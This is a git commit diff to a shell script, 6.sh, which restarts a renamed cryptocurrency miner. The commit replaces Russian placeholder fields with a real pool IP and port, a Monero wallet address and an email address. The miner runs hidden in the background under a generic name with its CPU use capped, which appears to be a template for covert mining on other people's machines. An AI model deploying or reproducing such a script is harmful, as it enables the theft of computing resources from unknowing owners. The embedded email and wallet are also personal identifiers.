f3e96e17317c84780e8a1dd80156f50943ddce80
truegs <58767593+truegs@users.noreply.github.com>
2019-12-13 00:21:33 +0300

    Update 6.sh

--- 6.sh
+++ 6.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o ВАШ ИП:ПОРТ -u ВАШ КОШЕЛЁК МОНЕРО --pass=x:ВАША ПОЧТА --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1
+defaultsoftwarename -o 51.89.199.121:49228 -u 48FmpSL9FpXWNK2Ny1jaNCRkhStfxSe4MaT7wvdWtG4wDEApNSQzzbzZEDWdAQpaAxBMerrDLRUAqibCgxKydnzLSHz1swG --pass=x:true.gs@yandex.ru --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1
